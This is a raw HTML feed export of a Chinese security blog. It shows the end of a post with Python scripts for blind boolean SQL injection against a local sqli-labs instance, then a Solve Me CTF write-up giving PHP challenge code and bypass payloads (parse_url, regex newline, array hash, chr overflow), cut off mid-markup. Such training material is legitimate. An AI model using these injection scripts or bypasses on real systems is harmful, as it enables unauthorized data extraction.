class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># Author:0verWatch</span></span><br><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://192.168.100.102/sqlilabs/Less-5/?id=1%27 and ascii(substr((select database()),&#123;_&#125;,1))=&#123;__&#125; %23"</span></span><br><span class="line"><span class="comment">#注意一下这里使用=去作为判断条件</span></span><br><span class="line"></span><br><span class="line">database = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">65</span>,<span class="number">127</span>):</span><br><span class="line">payload = url.format(_ = i,__ = j)</span><br><span class="line"><span class="comment">#print payload</span></span><br><span class="line">ans  = requests.get(payload)</span><br><span class="line"><span class="comment">#print ans.content</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">'You are in...........'</span> <span class="keyword">in</span> ans.content:</span><br><span class="line"><span class="comment"># database = database + chr(j)</span></span><br><span class="line"><span class="comment"># print database</span></span><br><span class="line">table_name += chr(j)</span><br><span class="line"><span class="keyword">print</span> table_name</span><br><span class="line"><span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>下面是使用二分法去搜索，我这里使用非递归的办法去实现二分查找</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># Author:0verWatch</span></span><br><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://192.168.100.102/sqlilabs/Less-5/?id=1%27 and ascii(substr((select database()),&#123;_&#125;,1))&gt;&#123;__&#125; %23"</span></span><br><span class="line"><span class="comment">#注意一下这里使用&gt;去作为判断条件</span></span><br><span class="line"></span><br><span class="line">database = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>  i  <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">15</span>):  <span class="comment">#这个地方可能会有些问题，数据库长度未知的时候过长会出现重复字母到时候自行删除即可</span></span><br><span class="line">min = <span class="number">65</span></span><br><span class="line">max = <span class="number">122</span></span><br><span class="line"><span class="keyword">while</span> abs(max - min) &gt; <span class="number">1</span>:</span><br><span class="line">mid = (max + min)//<span class="number">2</span></span><br><span class="line">payload = url.format(_=i,__ = mid)</span><br><span class="line">ans = requests.get(payload)</span><br><span class="line"><span class="keyword">print</span> payload</span><br><span class="line"><span class="keyword">if</span> <span class="string">'You are in...........'</span> <span class="keyword">in</span> ans.content:</span><br><span class="line">min = mid</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">max = mid</span><br><span class="line"></span><br><span class="line">database += chr(max)</span><br><span class="line"><span class="keyword">print</span> database</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2018/08/27/Pq0imF.png" alt="Pq0imF.png"></p>]]></content>
      
      <categories>
          
          <category> SQL注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 二分查找 </tag>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Solve Me解题记录</title>
      <link href="/2018/08/14/Solve-Me-wp/"/>
      <url>/2018/08/14/Solve-Me-wp/</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>前一阵子关注点在实战上，现在又回归CTF学习套路了，这个网站<a href="http://solveme.peng.kr" target="_blank" rel="noopener">http://solveme.peng.kr</a> 本来做了一半的题目，今天终于把他补完了，学到了炒鸡多的东西啊<a id="more"></a>~</p><p>##正文</p><h3 id="Warm-up"><a href="#Warm-up" class="headerlink" title="Warm up"></a>Warm up</h3><p>给出来一个密文和一段代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1wMDEyY2U2YTY0M2NgMTEyZDQyMjAzNWczYjZgMWI4NTt3YWxmY=</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">require</span> <span class="keyword">__DIR__</span>.<span class="string">'/lib.php'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> base64_encode(hex2bin(strrev(bin2hex($flag)))), <span class="string">'&lt;hr&gt;'</span>;</span><br><span class="line"></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>这题直接反过来写代码即可</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$s = <span class="string">'1wMDEyY2U2YTY0M2NgMTEyZDQyMjAzNWczYjZgMWI4NTt3YWxmY='</span>;</span><br><span class="line"><span class="keyword">echo</span> hex2bin(strrev(bin2hex(base64_decode($s))));</span><br></pre></td></tr></table></figure><h3 id="Bad-compare"><a href="#Bad-compare" class="headerlink" title="Bad compare"></a>Bad compare</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   error_reporting(<span class="number">0</span>);</span><br><span class="line">   <span class="keyword">require</span> <span class="keyword">__DIR__</span>.<span class="string">'/lib.php'</span>;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'answer'</span>]))&#123;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span>($_GET[<span class="string">'answer'</span>] === <span class="string">'尊찢悼嚴隆'</span>)&#123;</span><br><span class="line">           <span class="keyword">echo</span> $flag;</span><br><span class="line">       &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">           <span class="keyword">echo</span> <span class="string">'Wrong answer'</span>;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">echo</span> <span class="string">'&lt;hr&gt;'</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>这题可以知道我们要传进get参数，但是<code>===</code>后面的内容不在可见的ASCII码范围内于是我们抓包看一下<br>找到对应字符串的ASCII码，我们知道单引号url编码为%27,两个27之间的就是那串字符串的ASCII码，<br>直接构造<code>payload：?answer=%f0%ee%c2%f5%d3%fa%e5%f1%d7%cc</code>,得到flag</p><h3 id="Winter-sleep"><a href="#Winter-sleep" class="headerlink" title="Winter sleep"></a>Winter sleep</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">require</span> <span class="keyword">__DIR__</span>.<span class="string">'/lib.php'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'time'</span>]))&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!is_numeric($_GET[<span class="string">'time'</span>]))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'The time must be number.'</span>;</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>($_GET[<span class="string">'time'</span>] &lt; <span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">30</span> * <span class="number">2</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'This time is too short.'</span>;</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>($_GET[<span class="string">'time'</span>] &gt; <span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">30</span> * <span class="number">3</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'This time is too long.'</span>;</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            sleep((int)$_GET[<span class="string">'time'</span>]);</span><br><span class="line">            <span class="keyword">echo</span> $flag;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;hr&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>这一个题目我们运用了<code>int的强制转换</code>和<code>科学计数法</code><br>这个题目先使用科学计数法绕过前面的两个<code>time</code>以及<code>is_numeric</code>，最后通过int的阶段获取到flag，因为<code>60 * 60 * 24 * 30 * 2=5.184*10^6</code><br>现在的<code>payload：?time=5.185e6</code>,sleep大约5秒后出现flag<br>为什么出现这样的效果我们来测试一下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> $time = <span class="string">'5.185e6'</span>;</span><br><span class="line"> $num1 = <span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">30</span> * <span class="number">2</span>;</span><br><span class="line"> $num2 = <span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">30</span> * <span class="number">3</span>;</span><br><span class="line"> var_dump(!is_numeric($time));</span><br><span class="line"> var_dump($time&gt;$num1);</span><br><span class="line"> var_dump($time&lt;$num2);</span><br><span class="line"> var_dump((int)$time);</span><br><span class="line"></span><br><span class="line">bool(<span class="keyword">false</span>)</span><br><span class="line">bool(<span class="keyword">true</span>)</span><br><span class="line">bool(<span class="keyword">true</span>)</span><br><span class="line">int(<span class="number">5</span>)</span><br></pre></td></tr></table></figure><h3 id="Hard-login"><a href="#Hard-login" class="headerlink" title="Hard login"></a>Hard login</h3><p>一开始上手这一个题目，发现什么头绪也没有，因为他的那些参数我一个都不知道，发现url有点奇怪后来就尝试着直接去访问<code>index.php</code>，网页顿了一下又回到了login.php，怀疑存在<code>302跳转</code>，于是抓包看一下，果然重定向到<code>login.php</code><br>但同时我们也得到flag</p><p>还有第二种方法，直接curl一下看情况<br><a href="https://imgchr.com/i/P21ZSH" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/08/14/P21ZSH.md.png" alt="P21ZSH.md.png"></a></p><h3 id="URL-filtering"><a href="#URL-filtering" class="headerlink" title="URL filtering"></a>URL filtering</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   error_reporting(<span class="number">0</span>);</span><br><span class="line">   <span class="keyword">require</span> <span class="keyword">__DIR__</span>.<span class="string">"/lib.php"</span>;</span><br><span class="line"></span><br><span class="line">   $url = urldecode($_SERVER[<span class="string">'REQUEST_URI'</span>]);</span><br><span class="line">   $url_query = parse_url($url, PHP_URL_QUERY);</span><br><span class="line"></span><br><span class="line">   $params = explode(<span class="string">"&amp;"</span>, $url_query);</span><br><span class="line">   <span class="keyword">foreach</span>($params <span class="keyword">as</span> $param)&#123;</span><br><span class="line"></span><br><span class="line">       $idx_equal = strpos($param, <span class="string">"="</span>);</span><br><span class="line">       <span class="keyword">if</span>($idx_equal === <span class="keyword">false</span>)&#123;</span><br><span class="line">           $key = $param;</span><br><span class="line">           $value = <span class="string">""</span>;</span><br><span class="line">       &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">           $key = substr($param, <span class="number">0</span>, $idx_equal);</span><br><span class="line">           $value = substr($param, $idx_equal + <span class="number">1</span>);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span>(strpos($key, <span class="string">"do_you_want_flag"</span>) !== <span class="keyword">false</span> || strpos($value, <span class="string">"yes"</span>) !== <span class="keyword">false</span>)&#123;</span><br><span class="line">           <span class="keyword">die</span>(<span class="string">"no hack"</span>);</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'do_you_want_flag'</span>]) &amp;&amp; $_GET[<span class="string">'do_you_want_flag'</span>] == <span class="string">"yes"</span>)&#123;</span><br><span class="line">       <span class="keyword">die</span>($flag);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>这一个题目我们可以发现存在parse_url函数，这个函数有个漏洞可以用多个/符号去绕过，然后就不会执行<code>die(&quot;no hack&quot;)</code>;转而执行了下面的语句。<br>这里有篇方方土学长写过的总结:<a href="http://skysec.top/2017/12/15/parse-url%E5%87%BD%E6%95%B0%E5%B0%8F%E8%AE%B0/" target="_blank" rel="noopener">点我</a><br>构造的<code>payload：///?do_you_want_flag=yes</code><br>后来发现还有官方的解法，就是利用描点去绕过，从来都不知道还可以这样搞<br><code>http://urlfiltering.solveme.peng.kr/?%23&amp;do_you_want_flag=yes</code></p><p>#Hash collision</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">require</span> <span class="keyword">__DIR__</span>.<span class="string">'/lib.php'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'foo'</span>], $_GET[<span class="string">'bar'</span>]))&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(strlen($_GET[<span class="string">'foo'</span>]) &gt; <span class="number">30</span> || strlen($_GET[<span class="string">'bar'</span>]) &gt; <span class="number">30</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'Too long'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>($_GET[<span class="string">'foo'</span>] === $_GET[<span class="string">'bar'</span>])&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'Same value'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(hash(<span class="string">'sha512'</span>, $_GET[<span class="string">'foo'</span>]) !== hash(<span class="string">'sha512'</span>, $_GET[<span class="string">'bar'</span>]))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'Different hash'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> $flag, <span class="string">'&lt;hr&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>这种题目做了很多遍了，就是利用数组返回NULL去绕过，构造下面的payload</p><p><code>?foo[]=1&amp;bar[]=2</code></p><h3 id="Array2String"><a href="#Array2String" class="headerlink" title="Array2String"></a>Array2String</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">require</span> <span class="keyword">__DIR__</span>.<span class="string">'/lib.php'</span>;</span><br><span class="line"></span><br><span class="line">    $value = $_GET[<span class="string">'value'</span>];</span><br><span class="line"></span><br><span class="line">    $username = $_GET[<span class="string">'username'</span>];</span><br><span class="line">    $password = $_GET[<span class="string">'password'</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; count($value); ++$i) &#123;</span><br><span class="line">        <span class="keyword">if</span> ($_GET[<span class="string">'username'</span>]) <span class="keyword">unset</span>($username);</span><br><span class="line">        <span class="keyword">if</span> ($value[$i] &gt; <span class="number">32</span> &amp;&amp; $value[$i] &lt; <span class="number">127</span>) <span class="keyword">unset</span>($value);</span><br><span class="line">        <span class="keyword">else</span> $username .= chr($value[$i]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ($username == <span class="string">'15th_HackingCamp'</span> &amp;&amp; md5($password) == md5(file_get_contents(<span class="string">'./secret.passwd'</span>))) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'Hello '</span>.$username.<span class="string">'!'</span>, <span class="string">'&lt;br&gt;'</span>, PHP_EOL;</span><br><span class="line">            <span class="keyword">echo</span> $flag, <span class="string">'&lt;hr&gt;'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>发现要跟<code>./secret.passwd</code>路径下的内容一样，先去里面看一下，发现字符串<code>simple_passw0rd</code><br>这个题目get到了一个新的知识点</p><p>就是chr()这个函数再ASCII码超过255的时候会自动取余，我们利用这个特性去拼接username的字符串，于是写了个Python脚本构造payload: </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># Author:0verWatch</span></span><br><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"></span><br><span class="line">s = <span class="string">'''15th_HackingCamp'''</span></span><br><span class="line">dit = []</span><br><span class="line">payload = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">dit.append((ord(i)+<span class="number">256</span>))</span><br><span class="line"><span class="comment">#print dit </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> dit:</span><br><span class="line">payload += (<span class="string">'value[]='</span>+str(j)+<span class="string">'&amp;'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> payload+<span class="string">'password=simple_passw0rd'</span></span><br></pre></td></tr></table></figure><p>得到payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?value[]=305&amp;value[]=309&amp;value[]=372&amp;value[]=360&amp;value[]=351&amp;value[]=328&amp;value[]=353&amp;value[]=355&amp;value[]=363&amp;value[]=361&amp;value[]=366&amp;value[]=359&amp;value[]=323&amp;value[]=353&amp;value[]=365&amp;value[]=368&amp;password=simple_passw0rd</span><br></pre></td></tr></table></figure><p>最后得到flag</p><h3 id="Replace-filter"><a href="#Replace-filter" class="headerlink" title="Replace filter"></a>Replace filter</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">require</span> <span class="keyword">__DIR__</span>.<span class="string">'/lib.php'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'say'</span>]) &amp;&amp; strlen($_GET[<span class="string">'say'</span>]) &lt; <span class="number">20</span>)&#123;</span><br><span class="line"></span><br><span class="line">        $say = preg_replace(<span class="string">'/^(.*)flag(.*)$/'</span>, <span class="string">'$&#123;1&#125;&lt;!-- filtered --&gt;$&#123;2&#125;'</span>, $_GET[<span class="string">'say'</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/give_me_the_flag/'</span>, $say))&#123;</span><br><span class="line">            <span class="keyword">echo</span> $flag;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'What the f**k?'</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;hr&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>这题题目漏洞出现在正则匹配那里<br>根据我们查到的资料，因为以’^’开头，以’$’结尾的只能匹配一行，也就是说我们可以用<code>%0a</code>/url编码下的换行/去绕过<br>于是我们可以构造payload:?say=<code>%0Agive_me_the_flag</code><br>得到flag</p><h3 id="Give-me-a-link-2"><a href="#Give-me-a-link-2" class="headerlink" title="Give me a link 2"></a>Give me a link 2</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">require</span> <span class="keyword">__DIR__</span>.<span class="string">'/lib.php'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'url'</span>]))&#123;</span><br><span class="line">        $url = $_GET[<span class="string">'url'</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/_|\s|\0/'</span>, $url))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'Not allowed character'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $parse = parse_url($url);</span><br><span class="line">        <span class="keyword">if</span>(!preg_match(<span class="string">'/^https?$/i'</span>, $parse[<span class="string">'scheme'</span>]))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'Not allowed scheme'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!preg_match(<span class="string">'/^(localhost|127\.\d+\.\d+\.\d+|[^.]+)(\:\d+)?$/i'</span>, $parse[<span class="string">'host'</span>]))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'Not allowed host'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!preg_match(<span class="string">'/\/plz_give_me$/'</span>, $parse[<span class="string">'path'</span>]))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'Not allowed path'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);</span><br><span class="line">        <span class="keyword">if</span>($socket === <span class="keyword">false</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'Failed to create socket'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $host = gethostbyname($parse[<span class="string">'host'</span>]);</span><br><span class="line">        $port = is_null($parse[<span class="string">'port'</span>]) ? <span class="number">80</span> : $parse[<span class="string">'port'</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(socket_connect($socket, $host, $port) === <span class="keyword">false</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'Failed to connect'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $send = <span class="string">"HEAD /"</span>.$flag.<span class="string">" HTTP/1.1\r\n"</span>.</span><br><span class="line">            <span class="string">"Host: "</span>.$host.<span class="string">":"</span>.$port.<span class="string">"\r\n"</span>.</span><br><span class="line">            <span class="string">"Connection: Close\r\n"</span>.</span><br><span class="line">            <span class="string">"\r\n\r\n"</span>;</span><br><span class="line">        socket_write($socket, $send, strlen($send));</span><br><span class="line"></span><br><span class="line">        $recv = socket_read($socket, <span class="number">1024</span>);var_dump($recv);</span><br><span class="line">        <span class="keyword">if</span>(!preg_match(<span class="string">'/^HTTP\/1.1 200 OK\r\n/'</span>, $recv))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'Not allowed response'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        socket_close($socket);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Okay, I sent the flag.'</span>, <span class="string">'&lt;hr&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>跟上面一题类似，只是对于host有了过滤，这里我们用 <code>ip2long()</code> 函数将网络地址转化为数字地址，这样就可以绕过.的ip过滤<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span 